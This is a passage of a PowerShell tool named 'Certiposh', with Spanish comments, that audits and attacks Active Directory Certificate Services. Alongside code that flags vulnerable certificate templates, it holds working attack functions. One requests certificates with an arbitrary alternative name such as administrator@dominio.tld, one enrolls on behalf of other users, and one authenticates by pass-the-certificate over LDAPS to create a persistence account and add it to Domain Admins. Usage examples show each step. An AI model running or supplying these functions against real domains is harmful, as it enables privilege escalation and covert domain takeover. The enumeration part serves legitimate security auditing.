    $enrolleeSuppliesSubject = (
        ($template.certificateNameFlag -ne $null) -and 
        ([MS_PKI_CERTIFICATE_NAME_FLAG]$template.certificateNameFlag).HasFlag([MS_PKI_CERTIFICATE_NAME_FLAG]::ENROLLEE_SUPPLIES_SUBJECT)
    )

    $hasAuthenticationEku = $false
    If ($Template.extendedKeyUsage -ne $null) {
        $hasAuthenticationEku = (($template.extendedKeyUsage.Value -Contains $COMMONS_OIDS.SmartCardLogon.Value) -or ($template.extendedKeyUsage.Value -Contains $COMMONS_OIDS.ClientAuthentication.Value) -or ($template.extendedKeyUsage.Value -Contains $COMMONS_OIDS.PKINITClientAuthentication.Value))
    }
    if ($lowPrivilegedUsersCanEnroll -and $enrolleeSuppliesSubject -and $hasAuthenticationEku) { 
        If (!$result.HasFlag([COMMON_MISTAKES]::LOW_PRIV_CAN_ENROLL)) {$result += [COMMON_MISTAKES]::LOW_PRIV_CAN_ENROLL}
        If (!$result.HasFlag([COMMON_MISTAKES]::ENROLLEE_SUPPLIES_SUBJECT)) {$result += [COMMON_MISTAKES]::ENROLLEE_SUPPLIES_SUBJECT}
        If (!$result.HasFlag([COMMON_MISTAKES]::HAS_AUTENTICATION_EKU)) {$result += [COMMON_MISTAKES]::HAS_AUTENTICATION_EKU}
        If (!$result.HasFlag([COMMON_MISTAKES]::VULNERABLE)) {$result += [COMMON_MISTAKES]::VULNERABLE}
    }

    # 6.- If a low priv'ed user can request a cert with any of these EKUs (or no EKU), then privilege escalation is possible
    $hasDangerousEku = $false
    $c1 = $template.extendedKeyUsage -eq $null
    $c2 = $template.extendedKeyUsage.Length -eq 0
    $c3 = $template.extendedKeyUsage.Value -Contains $COMMONS_OIDS.AnyPurpose.Value
    $c4 = $template.extendedKeyUsage.Value -Contains $COMMONS_OIDS.CertificateRequestAgent.Value
    $c5 = $template.applicationPolicies.Value -Contains $COMMONS_OIDS.CertificateRequestAgentPolicy.Value
    $hasDangerousEku = $c1 -or $c2 -or $c3 -or $c4 -or $c5
    If ($lowPrivilegedUsersCanEnroll -and $hasDangerousEku) { 
        If (!$result.HasFlag([COMMON_MISTAKES]::HAS_DANGEROUS_EKU)) {$result += [COMMON_MISTAKES]::HAS_DANGEROUS_EKU}
        If (!$result.HasFlag([COMMON_MISTAKES]::VULNERABLE)) {$result += [COMMON_MISTAKES]::VULNERABLE}
    }

    # 7.- Does a certificate contain the  DISABLE_EMBED_SID_OID flag + DNS and DNS SAN flags
    if ( $Template.certificateNameFlag -eq $null -or $Template.enrollmentFlag -eq $null) {
        If (!$result.HasFlag([COMMON_MISTAKES]::NO_ELEGIBLE)) {$result += [COMMON_MISTAKES]::NO_ELEGIBLE}

    }
    $c1 = ([MS_PKI_CERTIFICATE_NAME_FLAG]$Template.certificateNameFlag).HasFlag([MS_PKI_CERTIFICATE_NAME_FLAG]::SUBJECT_ALT_REQUIRE_DOMAIN_DNS)
    $c2 = ([MS_PKI_CERTIFICATE_NAME_FLAG]$Template.certificateNameFlag).HasFlag([MS_PKI_CERTIFICATE_NAME_FLAG]::SUBJECT_REQUIRE_DNS_AS_CN)
    $c3 = ([MS_PKI_ENROLLMENT_FLAG]$Template.enrollmentFlag).HasFlag([MS_PKI_ENROLLMENT_FLAG]::NoSecurityExtension)
    If (($c1 -or $c2) -and $c3) { 
        If (!$result.HasFlag([COMMON_MISTAKES]::SUBJECT_REQUIRE_DNS_WITHOUT_SECURITY_EXTENSION)) {$result += [COMMON_MISTAKES]::SUBJECT_REQUIRE_DNS_WITHOUT_SECURITY_EXTENSION}
        If (!$result.HasFlag([COMMON_MISTAKES]::VULNERABLE)) {$result += [COMMON_MISTAKES]::VULNERABLE}
    }

    return $result
}

Function RequestCertificate {
    Param(
        [Parameter(Mandatory=$True)][string]$Template,
        [Parameter(Mandatory=$False)][string]$altName,
        [Parameter(Mandatory=$False)][bool]$machineContext = $False
    ) 
    If ($machineContext) {
        $success = GetSystem
    }
    $dummypwd = ConvertTo-SecureString -String "1234" -Force -AsPlainText
    $PKCS10 = New-Object -ComObject X509Enrollment.CX509CertificateRequestPkcs10
    $PKCS10.InitializeFromTemplateName(0x1,$Template)
    $PKCS10.PrivateKey.ExportPolicy = 1 # XCN_NCRYPT_ALLOW_EXPORT_FLAG
    $Request = New-Object -ComObject X509Enrollment.CX509Enrollment
    $Request.InitializeFromRequest($PKCS10)
    If ($PSBoundParameters.ContainsKey('altName')) {
        $SubjectAlternativeNamesExtension = New-Object -ComObject X509Enrollment.CX509ExtensionAlternativeNames
        $Sans = New-Object -ComObject X509Enrollment.CAlternativeNames
        $AlternativeNameObject = New-Object -ComObject X509Enrollment.CAlternativeName
        $AlternativeNameObject.InitializeFromString(11, [mailaddress]$altName)
        $Sans.Add($AlternativeNameObject)
        [void]([System.Runtime.Interopservices.Marshal]::ReleaseComObject($AlternativeNameObject))
        $SubjectAlternativeNamesExtension.Critical = $True
        $SubjectAlternativeNamesExtension.InitializeEncode($Sans)
        $Request.Request.GetInnerRequest(0).X509Extensions.Add($SubjectAlternativeNamesExtension)
    }
    $Request.Enroll()
    (Get-ChildItem Cert:\CurrentUser\My | Sort-Object {[system.datetime]::parse($_.NotAfter)} -Descending)[0] | Export-PfxCertificate -FilePath test.pfX -Password $dummypwd
    If ($machineContext) {
        $success = RevertToSelf
    }
}

Function RequestCertificateOnBehalfOf {
    Param(
        [Parameter(Mandatory=$True)][string]$Template,
        [Parameter(Mandatory=$True)][string]$enrollcert,
        [Parameter(Mandatory=$True)][string]$enrollcertpw,
        [Parameter(Mandatory=$False)][string]$onBeahalfOf,
        [Parameter(Mandatory=$False)][bool]$machineContext = $False

    ) 
    If ($machineContext) {
        $success = GetSystem
    }

    $dummypwd1 = ConvertTo-SecureString -String $enrollcertpw -Force -AsPlainText
    $dummypwd2 = ConvertTo-SecureString -String "1234" -Force -AsPlainText

    $cert = Import-PfxCertificate -Password $dummypwd1 -FilePath $enrollcert -Cert cert:\CurrentUser\my

    $PKCS10 = New-Object -ComObject X509Enrollment.CX509CertificateRequestPkcs10
    $PKCS10.InitializeFromTemplateName(0x1,$Template)
    $PKCS10.PrivateKey.ExportPolicy = 1 # XCN_NCRYPT_ALLOW_EXPORT_FLAG
    $PKCS10.Encode()

    $PKCS7 = New-Object -ComObject X509enrollment.CX509CertificateRequestPkcs7
    $PKCS7.InitializeFromInnerRequest($PKCS10)

    If ($PSBoundParameters.ContainsKey('onBeahalfOf')) {
        $PKCS7.RequesterName = $onBeahalfOf
    }

    $Base64 = [Convert]::ToBase64String($cert.RawData)
    $signer = New-Object -ComObject X509Enrollment.CSignerCertificate
    $signer.Initialize(0,0,1,$Base64)
    $PKCS7.SignerCertificate = $signer

    $Request = New-Object -ComObject X509Enrollment.CX509Enrollment
    $Request.InitializeFromRequest($PKCS7)
    $Request.Enroll()
    (Get-ChildItem Cert:\CurrentUser\My | Sort-Object {[system.datetime]::parse($_.NotAfter)} -Descending)[0] | Export-PfxCertificate -FilePath test.pxf -Password $dummypwd2
    If ($machineContext) {
        $success = RevertToSelf
    }
}

# Funciones genericas para representar informacion visualmente
Function IsLowPrivSid {
    [OutputType([bool])]
    Param(
        [Parameter(Mandatory=$True)][PSCustomObject]$sid
    ) 
    return (($sid -match '^S-1-5-21-.+-(513|515|545)$') -or ($sid -eq 'S-1-1-0') -or ($sid -eq 'S-1-5-11'))
}

Function GetUserSidString {
    [OutputType([string])]
    Param(
        [Parameter(Mandatory=$True)][PSCustomObject]$sid
    ) 
    $user = '<UNKNOWN>'
    try {
        $sidObj = New-Object System.Security.Principal.SecurityIdentifier($sid)
        $user = $sidObj.Translate([System.Security.Principal.NTAccount]).ToString()
    } catch {}
    return $user
}

Function PrintCertificateInfo {
    Param(
        [Parameter(Mandatory=$True)][System.Security.Cryptography.X509Certificates.X509Certificate2]$ca
    ) 
    Write-Host ("`tCert SubjectName   : {0}" -f $ca.SubjectName.Name)
    Write-Host ("`tCert Thumbprint    : {0}" -f $ca.Thumbprint)
    Write-Host ("`tCert Serial        : {0}" -f $ca.SerialNumber)
    Write-Host ("`tCert Start Date    : {0}" -f $ca.NotBefore)
    Write-Host ("`tCert End Date      : {0}" -f $ca.NotAfter)
    $chain = New-Object System.Security.Cryptography.X509Certificates.X509Chain
    $names = @()
    $null = $chain.Build($ca)
    $chain.ChainElements | %{
        $elem = $_
        $names += $elem.Certificate.SubjectName.Name.Replace(" ", "")
    }
    Write-Host ("`tCert Chain         : {0}" -f ($names -Join(" -> ")))
}

Function PrintEnterpriseCaInfo {
    Param(
        [Parameter(Mandatory=$True)][PSCustomObject]$ca,
        [Parameter(Mandatory=$True)][System.DirectoryServices.ActiveDirectorySecurity]$security, 
        [Parameter(Mandatory=$True)][CA_EDIT_FLAGS]$editflags, 
        [Parameter(Mandatory=$True)][System.Security.AccessControl.RawSecurityDescriptor]$enrollmentRights
    )
    Write-Host ("`tEnterprise CA Name : {0}" -f $ca.Name);
    Write-Host ("`tDNS Hostname       : {0}" -f $ca.dnsHostname);
    Write-Host ("`tFullName           : {0}\{1}" -f ($ca.dnsHostname, $ca.Name));
    Write-Host ("`tFlags              : {0}" -f $ca.Flags);
    $ca.certificates | %{
        $cert = $_
        PrintCertificateInfo -ca $cert
    }
    # SAN ?
    If ($editflags -band [CA_EDIT_FLAGS]::EDITF_ATTRIBUTESUBJECTALTNAME2) {
        Write-Host "`t[!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!"
    }

    Write-Host ("`tCA Permissions     :");
    $rules = $security.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
    $ownerSid = $security.GetOwner([System.Security.Principal.SecurityIdentifier])
    $ownerName = GetUserSidString($ownerSid.ToString())
    Write-Host ("`t`tOwner  : {0}" -f $ownerName)
    If (IsLowPrivSid -sid $ownerSid.ToString()) {
        Write-Host ("`t`t[!] Owner is a low-privilged principal!")
    }
    Write-Host ( ("`t`t{0,-6} {1,-42} Principal" -f ("Access", "Rights")) )
    $rules | %{
        $rule = $_
        $sid = $rule.IdentityReference.ToString()
        $rights = [CertSrvRights]$rule.ActiveDirectoryRights

        Write-Host ( 
            ("`t`t{0,-6} {1,-42} {2}" -f ($rule.AccessControlType, $rights, (GetUserSidString -sid $sid)))
        )

        If (IsLowPrivSid -sid $sid.ToString()) {
            If ($rights -band [CertSrvRights]::ManageCA) {
                Write-Host ("`t`t[!] Low-privileged principal has ManageCA rights!")
            }
            If ($rights -band [CertSrvRights]::ManageCertificates) {
                Write-Host ("`t`t[!] Low-privileged principal has ManageCertificates rights!")
            }
        }
    }

    If ($enrollmentRights -eq $null) {
        Write-Host ("`tEnrollment Agent Restrictions : None")
    } 

    If ($ca.templates.Count -gt 0) {
        Write-Host ("`tEnabled Certificate Templates:")
        $ca.templates | %{
            $tpl = $_.Trim()
            Write-Host ( "`t`t{0}" -f $tpl)
        }
    }
}

Function PrintCertTemplate {
    Param(
        [Parameter(Mandatory=$True)][PSCustomObject]$template
    )
    Write-Host ("`n`tTemplate Name                  : {0}" -f $template.name)
    Write-Host ("`tSchema Version                 : {0}" -f $template.schemaVersion)
    Write-Host ("`tValidity Period                : {0}" -f $template.validityPeriod)
    Write-Host ("`tRenewal Period                 : {0}" -f $template.renewalPeriod)
    Write-Host ("`tmsPKI-Certificate-Name-Flag    : {0}" -f $template.certificateNameFlag)
    Write-Host ("`tmsPKI-Enrollment-Flag          : {0}" -f $template.enrollmentFlag)
    Write-Host ("`tAuthorized Signatures Required : {0}" -f $template.authorizedSignatures)
    
    If (($template.raApplicationPolicies -ne $null) -and ($template.raApplicationPolicies.Count -gt 0)) {
        Write-Host ("`tApplication Policies           : {0}" -f ($template.raApplicationPolicies.FriendlyName -Join ", "))
    }
    
    If (($template.issuancePolicies -ne $null) -and ($template.issuancePolicies.Count -gt 0)) {
        Write-Host ("`tIssuance Policies              : {0}" -f ($template.issuancePolicies.FriendlyName -Join ", "))
    }

    If (($template.extendedKeyUsage -ne $null) -and ($template.extendedKeyUsage.Count -gt 0)) {
        Write-Host ("`tpkiextendedkeyusage            : {0}" -f ($template.extendedKeyUsage.FriendlyName -Join ", "))
    }

    If (($template.applicationPolicies -ne $null) -and ($template.applicationPolicies.Count -gt 0)) {
        Write-Host ("`tApplication Policies           : {0}" -f ($template.applicationPolicies.FriendlyName -Join ", "))
    }

    $ownerSid = $template.securityDescriptor.GetOwner([System.Security.Principal.SecurityIdentifier])
    $ownerName = GetUserSidString -sid $ownerSid

    $enrollmentPrincipals = @()
    $allExtendedRightsPrincipals = @()
    $fullControlPrincipals = @()
    $writeOwnerPrincipals = @()
    $writeDaclPrincipals = @()
    $writePropertyPrincipals = @()
    $rules = $template.securityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
    $rules | %{
        $rule = $_
        $sid = $rule.IdentityReference.ToString()
        $rights = $rule.ActiveDirectoryRights
        If ($rights.HasFlag([System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight)) {
            If ($rule.ObjectType.ToString() -eq "00000000-0000-0000-0000-000000000000"){
                $allExtendedRightsPrincipals += GetUserSidString -sid $sid
            }
            If ($rule.ObjectType.ToString() -eq "0e10c968-78fb-11d2-90d4-00c04f79dc55"){
                $enrollmentPrincipals += GetUserSidString -sid $sid
            }
        }
        If ($rights.HasFlag([System.DirectoryServices.ActiveDirectoryRights]::GenericAll)) {
            $fullControlPrincipals += GetUserSidString -sid $sid
        }
        If ($rights.HasFlag([System.DirectoryServices.ActiveDirectoryRights]::WriteOwner)) {
            $writeOwnerPrincipals += GetUserSidString -sid $sid
        }
        If ($rights.HasFlag([System.DirectoryServices.ActiveDirectoryRights]::WriteDacl)) {
            $writeDaclPrincipals += GetUserSidString -sid $sid
        }
        If (($rights.HasFlag([System.DirectoryServices.ActiveDirectoryRights]::WriteProperty)) -and ($rule.ObjectType.ToString() -eq "00000000-0000-0000-0000-000000000000")) {
            $writePropertyPrincipals += GetUserSidString -sid $sid
        }
    }
    Write-Host ("`tPermissions")
    Write-Host ("`t`tEnrollment Permissions")
    If ($enrollmentPrincipals.Length -gt 0) {
        Write-Host ("`t`t`tEnrollment Rights`n`t`t`t`t{0}" -f ($enrollmentPrincipals -Join "`n`t`t`t`t"))
    }
    If ($allExtendedRightsPrincipals.Length -gt 0) {
        Write-Host ("`t`t`tAll Extended Rights`n`t`t`t`t{0}" -f ($allExtendedRightsPrincipals -Join "`n`t`t`t`t"))
    }
    Write-Host ("`t`tObject Control Permissions")
    If ($fullControlPrincipals.Length -gt 0) {
        Write-Host ("`t`t`tFull Control Principals`n`t`t`t`t{0}" -f ($fullControlPrincipals -Join "`n`t`t`t`t"))
    }
    If ($writeOwnerPrincipals.Length -gt 0) {
        Write-Host ("`t`t`tWriteOwner Principals`n`t`t`t`t{0}" -f ($writeOwnerPrincipals -Join "`n`t`t`t`t"))
    }

    If ($template.PSobject.Properties.name -match 'mistakes') {
        Write-Host ("`t [!] Mistakes : {0}" -f $template.mistakes)
    }

}

Function PrintPKIObjects {
    Param(
        [Parameter(Mandatory=$True)][PSCustomObject[]]$Objects
    )
    $objectControllers = @{}
    $Objects | %{
        $Object = $_
        If ($Object.securityDescriptor -ne $null) {
            $ownerSid = $Object.securityDescriptor.GetOwner([System.Security.Principal.SecurityIdentifier])
            $owner = $null
            try {
                $owner = $Object.securityDescriptor.GetOwner([System.Security.Principal.NTAccount])
            } catch {}

            $ownerKey = "{0}`t{1}" -f ($owner, $ownerSid)
            If ($ownerKey -notin $objectControllers.Keys) {
                $objectControllers[$ownerKey] = @()
            }
            $objectControllers[$ownerKey] += ,@("Owner", $Object.distinguisedName)

            $aces = $Object.securityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
            $aces | %{
                $ace = $_
                $principalSid = $ace.IdentityReference.ToString();
                try {
                    $SID = New-Object System.Security.Principal.SecurityIdentifier($principalSid)
                    $principalName = $SID.Translate([System.Security.Principal.NTAccount])
                    $rights = $ace.ActiveDirectoryRights;
                    $principalKey = "{0}`t{1}" -f ($principalName, $principalSid)
                    If ($principalKey -notin $objectControllers.Keys) {
                        $objectControllers[$principalKey] = @()
                    }
                    If ($rights.HasFlag([System.DirectoryServices.ActiveDirectoryRights]::GenericAll)) {
                        $objectControllers[$principalKey] += ,@("GenericAll", $Object.distinguisedName)
                    }
                    ElseIf ($rights.HasFlag([System.DirectoryServices.ActiveDirectoryRights]::WriteOwner)) {
                        $objectControllers[$principalKey] += ,@("WriteOwner", $Object.distinguisedName)
                    }
                    ElseIf ($rights.HasFlag([System.DirectoryServices.ActiveDirectoryRights]::WriteDacl)) {
                        $objectControllers[$principalKey] += ,@("WriteDacl", $Object.distinguisedName)
                    }
                    ElseIf (($rights.HasFlag([System.DirectoryServices.ActiveDirectoryRights]::WriteProperty)) -and ($ace.ObjectType.ToString() -eq "00000000-0000-0000-0000-000000000000")) {
                        $objectControllers[$principalKey] += ,@("WriteAllProperties", $Object.distinguisedName)
                    }
                } catch { }
            }
        }
    }

    $objectControllers.GetEnumerator() | %{ 
        $v = $_
        If ($v.Value.Length -ne 0) {
            $parts = $v.Name -Split '\t'
            $userName = $parts[0];
            $userSID = $parts[1];
            $userString = $userSID;

            If (!(($userSID.EndsWith("-519")) -or ($userSID.EndsWith("-512")) -or ($userSID -eq "S-1-5-32-544") -or ($userSID -eq "S-1-5-18"))) {

                If (![string]::IsNullOrEmpty($userName)) {
                    $userString = "{0} ({1})" -f ($userName, $userSID)
                }
                Write-Host ("`n`t$userString")
                $v.Value | Select-Object -Unique | %{
                    $entry = $_
                    Write-Host ("        {0,-15} {1}" -f ($entry[0], $entry[1]))
                }
            }
        }
    }
}

Function Certiposh-CAS {
<#
    .DESCRIPTION
    Información básica de CAs y en caso de ser posible la consultas vía RPC, 
    detalles de la CA Raiz.

    .EXAMPLE
    Certiposh-CAS
#>
    $CAs = findCAs
    Write-Host ("`n[*] Root CAs")
    $CAs.RootCAs | %{
        $ca = $_
        If ($ca.certificates -ne $null) {
            $ca.certificates | %{
                $cert = $_
                PrintCertificateInfo -ca $cert
            }
        }
    }
    Write-Host ("`n[*] NTAuthCertificates - Certificates that enable authentication:")
    $CAs.NTAuthCertificates | %{
        $ca = $_
        If ($ca.certificates -ne $null) {
            $ca.certificates | %{
                $cert = $_
                PrintCertificateInfo -ca $cert
            }
        }
    }
    Write-Host ("`n[*] Enterprise/Enrollment CAs:")
    $CAs.EnterpriseCAs | %{
        $ca = $_
        $security = GetServerSecurityFromRegistry -dnsHostname $ca.dnsHostname -caName $ca.name
        $editflags = GetServerEditflagsFromRegistry -dnsHostname $ca.dnsHostname -caName $ca.name
        $enrollmentRights = GetServerEnrollmentRightsFromRegistry -dnsHostname $ca.dnsHostname -caName $ca.name
        If (($enrollmentRights -ne $null) -and ($editflags -ne $null) -and ($security -ne $null)) {
            PrintEnterpriseCaInfo -ca $ca -Security $security -editFlags $editflags -enrollmentRights $enrollmentRights
        }
    }
}

Function Certiposh-Find {
<#

.DESCRIPTION
Obtiene información detallada de las plantillas existentes.

PARAMETER Vulnerable
Especifica que solo se desea ver información de aquellas plantillas
que puedan presentar algún tipo de problema de seguridad.

.EXAMPLE
Certiposh-Find

.EXAMPLE
Certiposh-Find -Vulnerable

#>
    Param (
        [Parameter(Mandatory = $False)][Switch]$Vulnerable,
        [Parameter(Mandatory = $False)][Switch]$showAdmins
    )
    If ($Vulnerable) {
        $templates = findVulnerableTemplates
    } Else {
        $templates = findTemplates
    }
    $templates | %{
        $tpl = $_
        PrintCertTemplate -template $tpl
    }
}

Function Certiposh-Request {
<#

.DESCRIPTION
Solicita un certificado en base a una plantilla específica,
pudiendose indicar el nombre alternativo deseado, así como
si desea solicitarlo en nombre del usuario actual, o de la
maquina actual.

PARAMETER Template
Especifica en base a que plantilla se desea solicitar el certificado.

PARAMETER altName
El SUBJECT ALT NAME en caso de querer/requerir especificar dicha propiedad.

PARAMETER machineContext
Se utiliza para indicar si se quiere solicitar el certificado en el
contexto de la máquina actual o del usuario actual.

.EXAMPLE
Certiposh-Request -Template ESC2

.EXAMPLE
Certiposh-Request -Template ESC1 -altName "administrator@dominio.tld"

.EXAMPLE
Certiposh-Request -Template ESC1 -altName "administrator@dominio.tld" -machineContext $True

.NOTES
El certificado obtenido tendrá formato PFX y contraseña 1234

#>

    Param (
        [Parameter(Mandatory = $True)][string]$Template,
        [Parameter(Mandatory = $False)][string]$altName,
        [Parameter(Mandatory = $False)][bool]$machineContext = $False
    )
    If ($PSBoundParameters.ContainsKey('altName')) {
        RequestCertificate -Template $Template -altName $altName -machineContext $machineContext
    } Else {
        RequestCertificate -Template $Template -machineContext $machineContext
    }
}

Function Certiposh-RequestOnBehalf {
<#

.DESCRIPTION
Solicitud de certificado autenticandose con un certificado 
obtenido previamente, permite la especificación de solicitud
en nombre de otros usuarios si la plantilla así lo permite.
Así como solicitarlo en nombre del usuario actual, o de la
maquina actual.

PARAMETER Template
Especifica en base a que plantilla se desea solicitar el certificado.

PARAMETER enrollcert
Certificado con que autenticarse.

PARAMETER enrollcertpw
Contraseña del certificado con que autenticarse.

PARAMETER onBehalfOf
Se utiliza para indicar en nombre de que usuario se desea solicitar
el certificado.

PARAMETER machineContext
Se utiliza para indicar si se quiere solicitar el certificado en el
contexto de la máquina actual o del usuario actual.


.EXAMPLE
Certiposh-RequestOnBehalf -Template ESC2 -enrollcert sistemas.pfx -enrollcertpw "1234"

.EXAMPLE
Certiposh-RequestOnBehalf -Template ESC2 -enrollcert sistemas.pfx -enrollcertpw "1234" -onBehalfOf "administrator@dominio.tld"

.EXAMPLE
Certiposh-RequestOnBehalf -Template ESC2 -enrollcert sistemas.pfx -enrollcertpw "1234" -onBehalfOf "administrator@dominio.tld" -machineContext $True

.NOTES
El certificado obtenido tendrá formato PFX y contraseña 1234

#>

    Param (
        [Parameter(Mandatory = $True)][string]$template,
        [Parameter(Mandatory = $True)][string]$enrollcert,
        [Parameter(Mandatory = $True)][string]$enrollcertpw,
        [Parameter(Mandatory = $False)][string]$onBehalfOf = $null,
        [Parameter(Mandatory = $False)][bool]$machineContext = $False

    )
    If ($PSBoundParameters.ContainsKey('onBehalfOf')) {
        RequestCertificateOnBehalfOf -Template $template -enrollcert $enrollcert -enrollcertpw $enrollcertpw -onBeahalfOf $onBehalfOf -machineContext $machineContext
    } Else {
        RequestCertificateOnBehalfOf -Template $template -enrollcert $enrollcert -enrollcertpw $enrollcertpw -machineContext $machineContext
    }
}

Function Certiposh-Auth-Whoami {
<#

.DESCRIPTION
Utilizando Pass-The-Certificate, consulta el nombre de 
usuario con el que se realiza la autenticación (Schannel LDAPS)

PARAMETER enrollcert
Certificado con que autenticarse.

PARAMETER enrollcertpw
Contraseña del certificado con que autenticarse.

PARAMETER ldapsServer
Servicio LDAPS contra el que lanzar la consulta.

.EXAMPLE
Certiposh-Auth-Whoami -enrollcert administrador.pfx -enrollcertpw "1234" -ldapsServer dc.dominio.tld

#>
    Param (
        [Parameter(Mandatory = $True)][string]$enrollcert,
        [Parameter(Mandatory = $True)][string]$enrollcertpw,
        [Parameter(Mandatory = $True)][string]$ldapsServer
    )
    $dummypwd = ConvertTo-SecureString -String $enrollcertpw -Force -AsPlainText
    $LdapDirectoryIdentifier = [System.DirectoryServices.Protocols.LdapDirectoryIdentifier]::new($ldapsServer,636)
    $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($enrollcert, $dummypwd, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)
    $LdapConnection = [System.DirectoryServices.Protocols.LdapConnection]::new($LdapDirectoryIdentifier)
    $LdapConnection.ClientCertificates.Add($certificate)
    $LdapConnection.SessionOptions.VerifyServerCertificate = { $true }
    $LdapConnection.SessionOptions.QueryClientCertificate = { $certificate }
    $LdapConnection.SessionOptions.SecureSocketLayer = $true

    $whoami_req = New-Object System.DirectoryServices.Protocols.ExtendedRequest("1.3.6.1.4.1.4203.1.11.3")
    $whoami_resp = [System.DirectoryServices.Protocols.ExtendedResponse]$LdapConnection.SendRequest($whoami_req)
    Write-Host "Authenticated as:"
    $response = [System.Text.Encoding]::ASCII.GetString($whoami_resp.ResponseValue)
    Write-Host "`t$response"
}

Function Certiposh-Auth-NewDAUser {
<#

.DESCRIPTION
Utilizando Pass-The-Certificate, se añade un nuevo usuario al dominio
y posteriormente se le añade al grupo de dominio especificado (Schannel LDAPS)

PARAMETER enrollcert
Certificado con que autenticarse.

PARAMETER enrollcertpw
Contraseña del certificado con que autenticarse.

PARAMETER ldapsServer
Servicio LDAPS contra el que lanzar la consulta.

PARAMETER NewUserName
Nombre de usuario que se le quiere dar al usuario a crear.

PARAMETER targetGroup
Nombre del grupo al que se desea añadir al nuevo usuario


.EXAMPLE
Certiposh-Auth-NewDAUser -enrollcert administrador.pfx -enrollcertpw "1234" -ldapsServer dc.dominio.tld -NewUserName "usuario_persistencia" -TargetGroup "Domain Admins"

#>


    Param (
        [Parameter(Mandatory = $True)][string]$enrollcert,
        [Parameter(Mandatory = $True)][string]$enrollcertpw,
        [Parameter(Mandatory = $True)][string]$ldapsServer,
        [Parameter(Mandatory = $True)][string]$NewUserName,
        [Parameter(Mandatory = $True)][string]$TargetGroup
    )
    $dummypwd = ConvertTo-SecureString -String $enrollcertpw -Force -AsPlainText
    $LdapDirectoryIdentifier = [System.DirectoryServices.Protocols.LdapDirectoryIdentifier]::new($ldapsServer,636)
    $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($enrollcert, $dummypwd, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)
    $LdapConnection = [System.DirectoryServices.Protocols.LdapConnection]::new($LdapDirectoryIdentifier)
    $LdapConnection.ClientCertificates.Add($certificate)
    $LdapConnection.SessionOptions.VerifyServerCertificate = { $true }
    $LdapConnection.SessionOptions.QueryClientCertificate = { $certificate }
    $LdapConnection.SessionOptions.SecureSocketLayer = $true


    $rootDSE = ([ADSI]"LDAP://RootDSE").Properties.rootDomainNamingContext
    $udc1 = $ldapsServer.Split(".")[1].Trim()
    $udc2 = $ldapsServer.Split(".")[2].Trim()
    $user_dn = "CN=$NewUserName,CN=Users,$rootDSE"
    Write-Host $user_dn
    $upwd = [System.Text.Encoding]::Unicode.GetBytes($NewUserName)
    $attributes = [System.DirectoryServices.Protocols.DirectoryAttribute[]]@(
        New-Object -TypeName System.DirectoryServices.Protocols.DirectoryAttribute -ArgumentList "objectClass", @("user")
        New-Object -TypeName System.DirectoryServices.Protocols.DirectoryAttribute -ArgumentList "givenName", $NewUserName
        New-Object -TypeName System.DirectoryServices.Protocols.DirectoryAttribute -ArgumentList "sAMAccountName", $NewUserName
        New-Object -TypeName System.DirectoryServices.Protocols.DirectoryAttribute -ArgumentList "userAccountControl", "544"
        New-Object -TypeName System.DirectoryServices.Protocols.DirectoryAttribute -ArgumentList "cn", $NewUserName
        New-Object -TypeName System.DirectoryServices.Protocols.DirectoryAttribute -ArgumentList "pwdLastSet", "-1"
    )
    $add_req = New-Object System.DirectoryServices.Protocols.AddRequest($user_dn, $attributes)
    try {
        $add_resp = [System.DirectoryServices.Protocols.AddResponse]$LdapConnection.SendRequest($add_req)
    } catch [System.DirectoryServices.Protocols.DirectoryOperationException] {
        $PSItem.ToString()
    }

    $search_req = New-Object System.DirectoryServices.Protocols.SearchRequest
    $search_req.Filter = "(objectCategory=Group)"
    $search_req.Scope = [System.DirectoryServices.Protocols.SearchScope]::Subtree
    $search_req.DistinguishedName = "CN=$TargetGroup,CN=Users,$rootDSE"
    $search_req.Attributes.Add("members")
    $search_resp = [System.DirectoryServices.Protocols.SearchResponse]$LdapConnection.SendRequest($search_req)
    $members = [System.DirectoryServices.Protocols.DirectoryAttribute]$search_resp.Entries[0].Attributes['member']
    $members[0..($members.Count-1)]
 
    $addMod = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
    $addMod.Name = "member"
    $addMod.Add("CN=$NewUserName,CN=Users,$rootDSE")
    $addMod.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add
    $mod_req = New-Object System.DirectoryServices.Protocols.ModifyRequest("CN=$TargetGroup,CN=Users,$rootDSE", $addMod)
    $mod_resp = [System.DirectoryServices.Protocols.ModifyResponse]$LdapConnection.SendRequest($mod_req)
}